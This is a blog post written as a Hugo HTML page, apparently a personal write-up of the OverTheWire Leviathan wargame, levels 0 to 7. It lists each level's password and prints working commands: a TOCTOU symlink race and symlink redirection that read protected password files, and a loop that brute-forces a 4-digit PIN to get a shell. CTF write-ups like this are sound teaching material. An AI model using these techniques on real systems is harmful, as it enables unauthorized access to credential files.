@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Leviathan | My New Blog Site</title>
+<meta name="keywords" content=", ">
+<meta name="description" content="Overthewire Leviathan Writeup">
+<meta name="author" content="Tariq Baater">
+<link rel="canonical" href="https://tariqbaater.github.io/posts/2024/leviathan/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css" integrity="sha256-2jIR5e&#43;Ge/K3X9WmUVz&#43;1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://tariqbaater.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://tariqbaater.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://tariqbaater.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://tariqbaater.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://tariqbaater.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://tariqbaater.github.io/posts/2024/leviathan/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://tariqbaater.github.io/posts/2024/leviathan/">
+  <meta property="og:site_name" content="My New Blog Site">
+  <meta property="og:title" content="Leviathan">
+  <meta property="og:description" content="Overthewire Leviathan Writeup">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-12-23T06:17:50+03:00">
+    <meta property="article:modified_time" content="2024-12-23T06:17:50+03:00">
+    <meta property="article:tag" content="Cybersecurity">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Overthewire">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Leviathan">
+<meta name="twitter:description" content="Overthewire Leviathan Writeup">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://tariqbaater.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Leviathan",
+      "item": "https://tariqbaater.github.io/posts/2024/leviathan/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Leviathan",
+  "name": "Leviathan",
+  "description": "Overthewire Leviathan Writeup",
+  "keywords": [
+    "", ""
+  ],
+  "articleBody": "Leviathan leviathan0 username: leviathan0\npassword: leviathan0\nssh port: 2223\nuse grep to find the password.\nleviathan1 username: leviathan1\npassword: 3QJ3TgzHDq\nread the binary and trace with ltrace and strings.\nleviathan2 username: leviathan2\npassword: NsN1HwFoyN\nif you ltrace the the binary ‘printfile’ you will see it’s using access() function that is known for a vulnerability TOCTOU (Time-of-check to time-of-use) and was mostly abused using symlinks.\nCheck the binary how it works\nltrace -f ./printfile filename Since we found that access has a delay reading files, we can use that opportunity to read a filtered file. The idea is to modify the file between the moment it gets checked for permissions and the moment it gets opened. This is done by creating a symlink on the file, targeting the real file we wanna access.\nYou’ll need to run the commands on two separate screens, first we will chain multiple commands to symlink the target file to our tmp file in tmp then watch it run every 0.1 seconds.\nwatch -n 0.1 touch /tmp/tmpfolder/lev3; ln -sf /etc/leviathan_pass/lev3 /tmp/tmpfolder/lev3; rm /tmp/tmpfolder/lev3 On the second screen i will use a for loop to print the file 50 times hoping that i catch the delay loop hole before being restricted.\nfor i in {1..50}; do ./printfile /tmp/sbin/lev3; done After few loops the intended output will be printed.\nYou cant have that file... You cant have that file... You cant have that file... You cant have that file... You cant have that file... You cant have that file... f0n8h2iWLP You cant have that file... You cant have that file... You cant have that file... leviathan3 username: leviathan3\npassword: f0n8h2iWLP\nread the binary ’level3’ and trace with ltrace and strings, there is a string comparison, same as as leviathan1.\nleviathan4 username: leviathan4\npassword: WG1egElCvO\nThere is a binary labelled ‘bin’ in a hidden trash directory, if executed it prints out binary bytes. So i used the below script to decode the bytes to ascii text.\n#!/bin/bash for binary in \"$@\"; do printf \"\\\\$(printf '%03o' \"$((2#$binary))\")\" done If you run the above script against the binary you will find your password for leviathan5.\nchmod +x script.sh ./script 00110000 01100100 01111001 01111000 01010100 00110111 01000110 00110100 01010001 01000100 00001010 0dyxT7F4QD leviathan5 username: leviathan5\npassword: 0dyxT7F4QD\nThis one is also fairly easy.\n# If you echo foo into the file and run the leviathan5 binary, it will print out the file content. echo \"foo\" \u003e /tmp/file.log # output: foo # so all we have to do is to link the leviathan6 password file to /tmp/file.log ln -sf /etc/leviathan_pass/leviathan6 /tmp/file.log # and run the leviathan5 binary ./leviathan5 /tmp/file.log # output: szo7HDB88w leviathan6 username: leviathan6\npassword: szo7HDB88w\nThere is a binary that requires a 4 digit code, so i used the below script to generate the code.\nfor i in {1..9999}; do ./leviathan6 $i; done Eventually one of the loop will crack the code and we get shell, just cat the next level password.\nleviathan7 username: leviathan7\npassword: qEs5Io5yM8\nAnd that’s it for now.\n",
+  "wordCount" : "501",
+  "inLanguage": "en",
+  "datePublished": "2024-12-23T06:17:50+03:00",
+  "dateModified": "2024-12-23T06:17:50+03:00",
+  "author":{
+    "@type": "Person",
+    "name": "Tariq Baater"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://tariqbaater.github.io/posts/2024/leviathan/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "My New Blog Site",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://tariqbaater.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://tariqbaater.github.io/" accesskey="h" title="My New Blog Site (Alt + H)">My New Blog Site</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Leviathan
+    </h1>
+    <div class="post-description">
+      Overthewire Leviathan Writeup
+    </div>
+    <div class="post-meta"><span title='2024-12-23 06:17:50 +0300 +0300'>December 23, 2024</span>&nbsp;·&nbsp;<span>Tariq Baater</span>
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="leviathan">Leviathan<a hidden class="anchor" aria-hidden="true" href="#leviathan">#</a></h1>
+<h2 id="leviathan0">leviathan0<a hidden class="anchor" aria-hidden="true" href="#leviathan0">#</a></h2>
+<p>username: leviathan0<br>
+password: leviathan0<br>
+ssh port: 2223</p>
+<p>use grep to find the password.</p>
+<h2 id="leviathan1">leviathan1<a hidden class="anchor" aria-hidden="true" href="#leviathan1">#</a></h2>
+<p>username: leviathan1<br>
+password: 3QJ3TgzHDq</p>
+<p>read the binary and trace with ltrace and strings.</p>
+<h2 id="leviathan2">leviathan2<a hidden class="anchor" aria-hidden="true" href="#leviathan2">#</a></h2>
+<p>username: leviathan2<br>
+password: NsN1HwFoyN</p>
+<p>if you ltrace the the binary &lsquo;printfile&rsquo; you will see it&rsquo;s using access() function that is known for a vulnerability TOCTOU (Time-of-check to time-of-use) and was mostly abused using symlinks.</p>
+<p>Check the binary how it works</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ltrace -f ./printfile filename
+</span></span></code></pre></div><p>Since we found that access has a delay reading files, we can use that opportunity to read a filtered file.
+The idea is to modify the file between the moment it gets checked for permissions and the moment it gets opened. This is done by creating a symlink on the file, targeting the real file we wanna access.</p>
+<p>You&rsquo;ll need to run the commands on two separate screens, first we will chain multiple commands to symlink the target file to our tmp file in tmp then watch it run every 0.1 seconds.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>watch -n 0.1 touch /tmp/tmpfolder/lev3; ln -sf /etc/leviathan_pass/lev3 /tmp/tmpfolder/lev3; rm /tmp/tmpfolder/lev3
+</span></span></code></pre></div><p>On the second screen i will use a for loop to print the file 50 times hoping that i catch the delay loop hole before being restricted.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>1..50<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span>     ./printfile /tmp/sbin/lev3; <span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p>After few loops the intended output will be printed.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>You cant have that file...
+</span></span><span style="display:flex;"><span>You cant have that file...
+</span></span><span style="display:flex;"><span>You cant have that file...
+</span></span><span style="display:flex;"><span>You cant have that file...
+</span></span><span style="display:flex;"><span>You cant have that file...
+</span></span><span style="display:flex;"><span>You cant have that file...
+</span></span><span style="display:flex;"><span>f0n8h2iWLP
+</span></span><span style="display:flex;"><span>You cant have that file...
+</span></span><span style="display:flex;"><span>You cant have that file...
+</span></span><span style="display:flex;"><span>You cant have that file...
+</span></span></code></pre></div><h2 id="leviathan3">leviathan3<a hidden class="anchor" aria-hidden="true" href="#leviathan3">#</a></h2>
+<p>username: leviathan3<br>
+password: f0n8h2iWLP</p>
+<p>read the binary &rsquo;level3&rsquo; and trace with ltrace and strings, there is a string comparison, same as as leviathan1.</p>
+<h2 id="leviathan4">leviathan4<a hidden class="anchor" aria-hidden="true" href="#leviathan4">#</a></h2>
+<p>username: leviathan4<br>
+password: WG1egElCvO</p>
+<p>There is a binary labelled &lsquo;bin&rsquo; in a hidden trash directory, if executed it prints out binary bytes. So i used the below script to decode the bytes to ascii text.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">for</span> binary in <span style="color:#e6db74">&#34;</span>$@<span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    printf <span style="color:#e6db74">&#34;\\</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#39;%03o&#39;</span> <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$((</span><span style="color:#ae81ff">2#</span>$binary<span style="color:#66d9ef">))</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p>If you run the above script against the binary you will find your password for leviathan5.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod +x script.sh
+</span></span><span style="display:flex;"><span>./script <span style="color:#ae81ff">00110000</span> <span style="color:#ae81ff">01100100</span> <span style="color:#ae81ff">01111001</span> <span style="color:#ae81ff">01111000</span> <span style="color:#ae81ff">01010100</span> <span style="color:#ae81ff">00110111</span> <span style="color:#ae81ff">01000110</span> <span style="color:#ae81ff">00110100</span> <span style="color:#ae81ff">01010001</span> <span style="color:#ae81ff">01000100</span> <span style="color:#ae81ff">00001010</span>
+</span></span><span style="display:flex;"><span>0dyxT7F4QD
+</span></span></code></pre></div><h2 id="leviathan5">leviathan5<a hidden class="anchor" aria-hidden="true" href="#leviathan5">#</a></h2>
+<p>username: leviathan5<br>
+password: 0dyxT7F4QD</p>
+<p>This one is also fairly easy.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># If you echo foo into the file and run the leviathan5 binary, it will print out the file content.</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;foo&#34;</span> &gt; /tmp/file.log
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># output: foo</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># so all we have to do is to link the leviathan6 password file to /tmp/file.log</span>
+</span></span><span style="display:flex;"><span>ln -sf /etc/leviathan_pass/leviathan6 /tmp/file.log
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># and run the leviathan5 binary</span>
+</span></span><span style="display:flex;"><span>./leviathan5 /tmp/file.log
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># output: szo7HDB88w</span>
+</span></span></code></pre></div><h2 id="leviathan6">leviathan6<a hidden class="anchor" aria-hidden="true" href="#leviathan6">#</a></h2>
+<p>username: leviathan6<br>
+password: szo7HDB88w</p>
+<p>There is a binary that requires a 4 digit code, so i used the below script to generate the code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>1..9999<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span> ./leviathan6 $i; <span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p>Eventually one of the loop will crack the code and we get shell, just cat the next level password.</p>
+<h2 id="leviathan7">leviathan7<a hidden class="anchor" aria-hidden="true" href="#leviathan7">#</a></h2>
+<p>username: leviathan7<br>
+password: qEs5Io5yM8</p>
+<p>And that&rsquo;s it for now.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://tariqbaater.github.io/tags/cybersecurity/">Cybersecurity</a></li>
+      <li><a href="https://tariqbaater.github.io/tags/ctf/">Ctf</a></li>
+      <li><a href="https://tariqbaater.github.io/tags/overthewire/">Overthewire</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>© 2024 Tariq Baater. All rights reserved.</span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
